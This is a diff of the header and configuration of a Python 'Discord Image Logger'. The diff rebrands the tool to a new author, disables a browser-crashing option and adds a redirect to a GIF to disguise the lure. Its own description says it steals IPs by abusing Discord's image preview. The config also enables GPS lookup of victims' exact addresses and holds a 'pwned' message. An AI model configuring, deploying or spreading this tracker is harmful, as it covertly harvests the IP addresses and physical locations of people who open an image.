@@ -1,5 +1,5 @@
 # Image Logger
-# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
+# By Team raiidannnnnn | https://github.com/raiidannnnnn
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -8,7 +8,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "C00lB0i"
+__author__ = "raiidannnnnn"
 
 config = {
     # BASE CONFIG #
@@ -22,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
+        "message": "This browser has been pwned by raiidannnnnn's Image Logger. https://github.com/raiidannnnnn", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://tenor.com/view/furry-gif-8941480796141217220" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
